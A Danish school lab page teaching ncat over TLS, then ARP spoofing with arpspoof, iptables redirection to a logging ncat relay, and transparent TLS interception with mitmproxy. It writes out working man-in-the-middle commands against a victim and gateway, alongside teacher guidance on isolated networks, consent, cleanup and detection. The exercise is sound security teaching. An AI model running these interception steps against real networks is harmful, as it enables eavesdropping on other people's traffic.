# Avanceret ncat: SSL og ARP-spoofing

På [forrige side](python-kryptering.md) skrev I jeres egne Python-cifre. Her ser vi,
hvordan rigtige værktøjer gør det samme i praksis — og hvordan de to mere
virkelighedstro manden-i-midten-metoder, der blev nævnt på
[Manden-i-midten](manden-i-midten.md), faktisk virker.

## Kryptering med ncat --ssl

Som standard er ncat-trafik **ikke** krypteret. Det betyder, at en anden på netværket i
princippet kan læse med. `ncat` kan bruge TLS, hvis begge parter har et certifikat. Det
ligner det, I lige har lavet selv — en offentlig og en privat nøgle — men med nøgler,
der er alt for store til at knække, og uden at I selv skal styre matematikken.

Lav et selvsigneret certifikat (kun til øvelse!):

```sh
openssl req -x509 -newkey rsa:2048 -nodes \
  -keyout ncat-noegle.pem -out ncat-cert.pem -days 7 \
  -subj "/CN=netbird-oevelse"
```

På **serveren**:

```sh
ncat --ssl -l 5001 --ssl-cert ncat-cert.pem --ssl-key ncat-noegle.pem
```

På **klienten**:

```sh
ncat --ssl 100.101.102.103 5001
```

> Netbird-trafik mellem to peers er allerede krypteret med **WireGuard**. `--ssl`
> lægger et ekstra lag ovenpå (ende-til-ende i programmet selv). Det er nyttigt at
> vide, når vi kommer til ARP-spoofing og mitmproxy nedenfor.

## ARP-spoofing + ncat

På et almindeligt **kabel-/Wi-Fi-netværk** (ikke over Netbird) kan man narre en computer
til at tro, at man er netværkets gateway. Det hedder **ARP-spoofing**. Værktøjet
`arpspoof` ligger på laptoppen (fra pakken `dsniff`).

> Netbird-trafik kan **ikke** aflyttes på denne måde, fordi den er krypteret inde i en
> WireGuard-tunnel. Denne metode virker derfor kun i et lokalt øvelsesnetværk, hvor I
> bevidst har slået Netbird fra, eller mellem maskiner på samme Wi-Fi.

På **MitM-laptoppen** — find dit interface og IP-adresser:

```sh
ip -brief addr                  # find fx wlan0 og de lokale adresser
ip route                        # find gateway (default via ...)
```

Slå videresendelse af pakker til:

```sh
sudo sysctl -w net.ipv4.ip_forward=1
```

Start ARP-spoofing i **to** terminaler (byt `<iface>`, `<offer>` og `<gateway>` ud):

```sh
# Fortæl offeret, at jeg er gatewayen
sudo arpspoof -i wlan0 -t 192.168.1.50 192.168.1.1
```

```sh
# Fortæl gatewayen, at jeg er offeret
sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.50
```

Nu går offerets trafik gennem MitM-laptoppen. Send trafikken videre til en `ncat`-lytter
ved hjælp af en firewall-regel (omdirigering):

```sh
# Send alt på port 7000 videre til vores ncat-lytter på port 7001
sudo iptables -t nat -A PREROUTING -p tcp --dport 7000 \
  -j REDIRECT --to-ports 7001

# Lytteren videresender til den rigtige server og logger alt
ncat -l 7001 --sh-exec "ncat 192.168.1.60 7000" \
  --output /tmp/aflytning.log
```

På **Elev B** (den rigtige server) og **Elev A** (offeret):

```sh
# Elev B
ncat -l 7000
```

```sh
# Elev A
ncat 192.168.1.60 7000
```

Ryd op igen, når I er færdige (vigtigt!):

```sh
sudo iptables -t nat -D PREROUTING -p tcp --dport 7000 \
  -j REDIRECT --to-ports 7001
sudo sysctl -w net.ipv4.ip_forward=0
# Stop arpspoof med Ctrl+C i begge terminaler
```

Man kan ofte se et ARP-angreb ved at kigge efter **den samme MAC-adresse** på flere
IP-adresser:

```sh
ip neigh
```

## TLS-aflytning med mitmproxy

Over `--ssl` eller HTTPS kan en simpel `ncat`-lytter **ikke** læse indholdet — den ser
kun uforståelige bytes (krypteret tekst). For at vise, hvordan man alligevel kan komme
ind på det, bruger man et **proxy**-værktøj som `mitmproxy`. Det kræver, at offerets
maskine installerer og stoler på mitmproxys certifikat (noget man aldrig bør gøre på en
maskine, man ikke selv ejer).

Start den transparente proxy på **MitM-laptoppen**:

```sh
# Åbner et web-interface på http://127.0.0.1:8081 og en proxy på port 8080
mitmweb --mode transparent --listen-port 8080

# Certifikatet, som offeret skal installere (i en rigtig øvelse):
ls ~/.mitmproxy/mitmproxy-ca-cert.pem
```

Send trafikken gennem proxyen med en firewall-regel:

```sh
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 \
  -j REDIRECT --to-ports 8080
```

Når offeret først stoler på mitmproxy-certifikatet, kan `mitmweb` vise al trafik i
klartekst i browseren. Uden certifikatet får offeret en **certifikat-advarsel** — og
det er netop pointen: det er sådan, man opdager aflytningen.

Vil du i stedet se, at trafikken faktisk **er** krypteret, kan I optage den og åbne
optagelsen (I kan ikke læse teksten, og det er hele pointen):

```sh
# Gem en pcap-fil, og åbn den i termshark
sudo tcpdump -i wlan0 -w /tmp/trafik.pcap port 5001
termshark -r /tmp/trafik.pcap
```

## Til læreren

- Sæt et **isoleret øvelsesnetværk** op (fx et gæste-Wi-Fi uden adgang til skolens
  øvrige net), eller slå Netbird fra på de deltagende maskiner under ARP-spoofing- og
  mitmproxy-øvelserne ovenfor.
- Del kun Netbird-adresserne mellem de grupper, der skal arbejde sammen.
- Ryd altid op efter øvelsen: `iptables`-regler, `ip_forward`, `arpspoof`-processer og
  certifikater.
- Brug gerne øvelsen som afsæt for en snak om **samtykke, lovgivning og digital
  sikkerhed** — ikke bare teknik.

## Opgaver til eleverne

1. **TLS:** Prøv `ncat --ssl`. Hvad ser en `tcpdump`-optagelse af trafikken? Hvorfor
   kan I ikke læse teksten?

Videre til [Få hjælp](../faa-hjaelp.md).
